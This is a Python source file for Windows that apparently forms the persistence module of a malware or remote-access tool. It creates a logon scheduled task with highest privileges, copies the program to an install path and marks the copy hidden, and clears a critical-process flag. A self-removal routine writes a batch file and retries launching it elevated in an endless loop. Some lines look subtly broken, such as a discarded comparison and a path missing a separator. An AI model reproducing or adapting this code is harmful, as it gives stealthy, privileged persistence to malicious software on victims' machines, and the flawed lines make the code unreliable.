import os
import shutil
import subprocess
from ctypes import windll, byref, c_bool


# Adding a script to startup

def AddToAutorun(AutorunName, InstallPath, ProcessName):
 subprocess.Popen('schtasks /create /f /sc onlogon /rl highest /tn "' + AutorunName + '" /tr "' + InstallPath + '\\' + ProcessName + '"',
  shell=True)

def CopyToAutorun(CurrentPath, InstallPath, ProcessName):
 shutil.copy2(CurrentPath, r'' + InstallPath + '\\' + ProcessName)
 windll.kernel32.SetFileAttributesW(InstallPath + '\\' + ProcessName, 2)


# Check if exists

def Exists(AutorunName):
 try:
  process = subprocess.check_output(f"schtasks /query /tn \"{AutorunName}\"",
   shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode(encoding="utf8", errors="strict")
 except subprocess.CalledProcessError:
  return False
 else:
  return not "ERROR:" in process


#Removes itself from the system

def Uninstall(AutorunName, InstallPath, ProcessName, CurrentName, CurrentPath, Directory):
 windll.ntdll.RtlSetProcessIsCritical(0, 0, 0) == 0
 windll.kernel32.SetFileAttributesW(CurrentPath, 0)
 windll.kernel32.SetFileAttributesW(InstallPath + '\\' + ProcessName, 0)

 with open(os.path.join(Directory, 'Uninstaller.bat'), 'w') as OPATH:
   OPATH.writelines(['taskkill /f /im "' + CurrentName + '"\n', 
                     'schtasks /delete /f /tn "'+AutorunName+'"\n', 
                     'del /s /q "' + CurrentPath + '"\n',
                     'del /s /q "' + InstallPath + '\\' + ProcessName + '"\n',
                     'rmdir /s /q "' + Directory + '"'])

 while True:
  try:
   os.startfile(Directory + 'Uninstaller.bat', 'runas')
  except:
   pass
  else:
   break